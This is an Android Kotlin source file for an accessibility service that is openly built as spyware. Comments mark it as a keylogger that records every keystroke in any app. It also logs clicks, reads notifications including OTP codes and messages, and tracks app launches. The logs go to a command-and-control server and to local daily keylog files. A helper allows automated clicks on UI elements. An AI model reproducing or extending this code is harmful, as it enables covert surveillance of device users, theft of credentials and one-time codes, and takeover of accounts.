package com.shadow.a11y

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class ShadowAccessibilityService : AccessibilityService() {

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i("ShadowA11y", "Accessibility Service Connected")

        try {
            com.shadow.ShadowWorker.enqueue(applicationContext)
        } catch (e: Exception) {
            Log.e("ShadowA11y", "Failed to enqueue worker", e)
        }

        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                         AccessibilityEvent.TYPE_VIEW_CLICKED or
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                         AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 100
        }
        this.serviceInfo = info

        getSharedPreferences("shadow_state", Context.MODE_PRIVATE)
            .edit().putBoolean("a11y_active", true).apply()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: "unknown"
        val eventType = event.eventType
        val timestamp = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())

        var logEntry: String? = null

        // 1. Keylogger (every keystroke in any text field)
        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val text = event.text.joinToString("")
            if (text.isNotBlank()) {
                logEntry = "[$timestamp][KEYLOG][$packageName] $text"
            }
        }

        // 2. Click Monitor
        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            val text = event.text.joinToString("")
            val desc = event.contentDescription?.toString() ?: ""
            logEntry = "[$timestamp][CLICK][$packageName] '$text' '$desc'"
        }

        // 3. Notification Reader (OTP codes, incoming messages)
        if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            val text = event.text.joinToString(" | ")
            logEntry = "[$timestamp][NOTIF][$packageName] $text"
        }

        // 4. App Launch / Screen Change
        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val className = event.className?.toString() ?: ""
            logEntry = "[$timestamp][WINDOW][$packageName] $className"
        }

        if (logEntry != null) {
            // Send to C2 (live)
            com.shadow.ShadowCore.logEvent(logEntry!!)
            // Write to daily file (offline buffer)
            writeToDailyFile(logEntry!!)
        }
    }

    private fun writeToDailyFile(entry: String) {
        try {
            val dateStr = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date())
            val dir = File(filesDir, "keylogs")
            if (!dir.exists()) dir.mkdirs()
            val file = File(dir, "keylog_$dateStr.txt")
            file.appendText(entry + "\n")
        } catch (e: Exception) {
            Log.e("ShadowA11y", "Failed to write keylog file", e)
        }
    }

    override fun onInterrupt() {
        Log.w("ShadowA11y", "Accessibility Service Interrupted")
        getSharedPreferences("shadow_state", Context.MODE_PRIVATE)
            .edit().putBoolean("a11y_active", false).apply()
    }

    fun clickNodeById(viewId: String): Boolean {
        val root = rootInActiveWindow ?: return false
        val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
        for (node in nodes) {
            if (node.isClickable) {
                return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
        }
        return false
    }
}
